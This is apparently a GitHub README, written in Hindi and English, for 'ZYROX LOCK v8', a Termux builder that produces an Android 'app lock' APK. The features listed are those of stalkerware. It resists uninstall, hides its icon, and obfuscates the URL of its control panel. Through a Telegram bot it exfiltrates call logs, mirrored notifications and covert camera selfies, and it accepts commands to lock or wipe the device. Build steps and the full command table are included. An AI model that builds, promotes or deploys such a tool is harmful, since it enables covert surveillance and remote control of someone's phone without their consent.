<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=200&section=header&text=KMJ%20TIPS&fontSize=75&fontColor=ffffff&animation=twinkling" width="100%"/>

<p align="center">
  <img src="assets/logo.png" width="170" alt="KMJ TIPS Logo"/>
</p>

<h1 align="center">🔒 ZYROX LOCK v8 — APP LOCK BUILDER</h1>

<p align="center">
  <img src="https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=600&size=21&pause=1000&color=00E5FF&center=true&vCenter=true&width=680&lines=Android+App-Lock+Builder+%F0%9F%94%92;Anti-Uninstall+Protection+%F0%9F%9B%A1%EF%B8%8F;Encrypted+Panel+URL+%F0%9F%94%90;Call+Logs+%2B+Notification+Mirror+%F0%9F%93%9E;Intruder+Selfie+%2B+24x7+Telegram+Control" alt="typing"/>
</p>

<p align="center">
  <a href="https://t.me/kmjTrick"><img src="https://img.shields.io/badge/Telegram-Join_Channel-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram"/></a>
  <a href="https://youtube.com/@kmjtips"><img src="https://img.shields.io/badge/YouTube-Subscribe-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube"/></a>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Version-v8-00E5FF?style=flat-square&logo=android&logoColor=white"/>
  <img src="https://img.shields.io/badge/Termux-Ready-32CD32?style=flat-square&logo=android&logoColor=white"/>
  <img src="https://img.shields.io/badge/No_Apktool-Needed-FF2D78?style=flat-square"/>
</p>

---

## ⚡ Features

| Feature | Detail |
|---|---|
| 🔑 2-Password Model | Offline (builder-only, safe fallback) + Online (remotely changeable) |
| 🛡️ Anti-Uninstall | Device Admin + Accessibility guard — uninstall screen pe turant lock back + Telegram 🚨 alert |
| 🗑️ Safe Uninstall | Unlocked panel se offline password → clean uninstall |
| 🔐 Encrypted Panel URL | SHA-256 stream cipher, per-build random key — APK me plain URL nahi |
| 🔒 Panel Page Lock | SHA-256 password gate inside `index.html` |
| 📞 Call Logs | `/calls` → last 20 calls (naam, number, type, duration) Telegram pe |
| 🔔 Notification Mirror | Phone notifications → Telegram (`/notifmirror on\|off`) |
| 📸 Intruder Selfie | 3rd wrong password pe front-camera photo Telegram pe |
| 📡 24/7 Remote Control | Foreground service + watchdog + boot receiver |
| ⌨️ Web Panel | Neon animated panel — Call Logs button + Custom Command box |
| 👻 Stealth Mode | Launcher icon hide + dialer secret code |
| ☠️ Panic Password | Fake unlock + data wipe (optional) |

## 🚀 Build (Termux)

```bash
git clone https://github.com/zyroxteam/KMJ-TIPS-APP-LOCK.git
cd KMJ-TIPS-APP-LOCK
bash setup.sh
python3 build.py
```

Builder **13 steps** puchega — passwords, Telegram bot, **panel URL + encryption**, panel page password, call log / mirror. Output:

- 📱 `ZYROX-LOCK.apk` → **MT Manager me sign** karo → install
- 🌐 `index.html` → host karo (GitHub Pages / Netlify / Vercel)

## 📲 App Setup (first open)

1. 🛡️ **ENABLE ADMIN** → Activate
2. 👁️ **ENABLE GUARD** → Accessibility ON
3. 🔔 **Notification Access** → ON (mirror chahiye to, else SKIP)
4. 📞 **Call Log** → ALLOW (`/calls` chahiye to, else SKIP)

## 🤖 Remote Commands

| Command | Kaam |
|---|---|
| `/lock` | Phone lock |
| `/unlock <pw>` | Unlock (offline/online password) |
| `/calls` | Last 20 call logs → Telegram |
| `/notifmirror on\|off` | Notification mirror toggle |
| `/setpw <new>` | Online password change |
| `/setofflinepw <new>` | Offline password change ⚠️ |
| `/setonlinepw <new>` | Online password change |
| `/selfie` | Intruder selfie abhi |
| `/notify <msg>` | Phone pe notification bhejo |
| `/settext <text>` | Lock screen text |
| `/setimage <url>` | Lock screen image |
| `/status` | Lock state + wrong attempts |
| `/wipe` | Wipe (panic mode ON ho to) |

> Web panel se bhi ye sab — panel secret builder deta hai, bina secret ke commands kaam nahi karenge.

## 🛡️ Notes

- Battery optimization → **Unrestricted** rakho (24/7 service ke liye)
- Fingerprint intentionally removed — password-only unlock
- Apne device ke liye banao, visible permissions ke saath

---

<p align="center">
  <a href="https://t.me/kmjTrick"><img src="https://img.shields.io/badge/Telegram-@kmjTrick-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram"/></a>
  <a href="https://youtube.com/@kmjtips"><img src="https://img.shields.io/badge/YouTube-@kmjtips-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube"/></a>
</p>

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&height=130&section=footer" width="100%"/>

<p align="center"><b>Made with 💛 by KMJ TIPS</b></p>
